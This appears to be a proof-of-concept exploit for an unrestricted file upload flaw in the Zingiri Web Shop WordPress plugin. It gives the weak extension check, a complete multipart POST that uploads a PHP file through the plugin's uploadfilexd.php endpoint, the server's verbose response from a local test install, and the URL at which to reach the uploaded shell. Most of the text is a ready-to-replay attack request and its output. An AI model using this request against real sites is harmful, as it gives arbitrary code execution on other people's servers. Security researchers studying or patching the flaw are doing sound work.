Exploit:

php poc.php


 upload file but extension limited, but other server config still run file if match .php*

if (($ext != "jpg") && ($ext != "jpeg") && ($ext != "png") && ($ext != "gif")) {
		$json['error'][] = $file . " is not support image file";

Burpsuite Request:

POST /wordpress/wp-content/plugins/zingiri-web-shop/fwkfor/ajax/uploadfilexd.php?fh=/&action=save HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-Length: 216
Content-Type: multipart/form-data; boundary=------------------------452aab5b3cad62c9
Connection: close

--------------------------452aab5b3cad62c9
Content-Disposition: form-data; name="fh"; filename="info.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
--------------------------452aab5b3cad62c9--







=> RESPONSE

HTTP/1.1 200 OK
Date: Fri, 24 Aug 2018 04:02:12 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.5.35
X-Powered-By: PHP/5.5.35
Content-Length: 1565
Connection: close
Content-Type: text/html

<br />
<b>Notice</b>:  Use of undefined constant APHPS_TEMP_DIR - assumed 'APHPS_TEMP_DIR' in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\zingiri-web-shop\fwkfor\ajax\uploadfilexd.php</b> on line <b>5</b><br />
<br />
<b>Notice</b>:  Use of undefined constant APHPS_TEMP_DIR - assumed 'APHPS_TEMP_DIR' in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\zingiri-web-shop\fwkfor\ajax\uploadfilexd.php</b> on line <b>7</b><br />
<br />
<b>Notice</b>:  Use of undefined constant APHPS_TEMP_DIR - assumed 'APHPS_TEMP_DIR' in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\zingiri-web-shop\fwkfor\ajax\uploadfilexd.php</b> on line <b>10</b><br />
<br />
<b>Warning</b>:  unlink(APHPS_TEMP_DIR///): Permission denied in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\zingiri-web-shop\fwkfor\ajax\uploadfilexd.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  symlink(): Could not fetch file information(error 3) in <b>C:\xampp\htdocs\wordpress\wp-content\plugins\zingiri-web-shop\fwkfor\ajax\uploadfilexd.php</b> on line <b>12</b><br />
<html>
<head>
  <script type="text/javascript" src="http://form.clientcentral.info/js/min/jquery.js"></script>
<script type="text/javascript">
jQuery(document).ready(function(){
	jQuery('#fh').bind('change',this,function() {
		var form=jQuery('#fhform');
		form.submit();
	});
});
</script>
</head>
<body>
	<form id="fhform" enctype="multipart/form-data" method="post" action="load.php?action=save&fh=/" />
	<input id="fh" type="file" name="fh" value="fhname"/>
	<div id="fhfile">
	info.php	</div>
	</form>
</body>
</html>

access shell at url:


http://127.0.0.1/wordpress/wp-content/plugins/zingiri-web-shop/fwkfor/ajax/APHPS_TEMP_DIR/info.php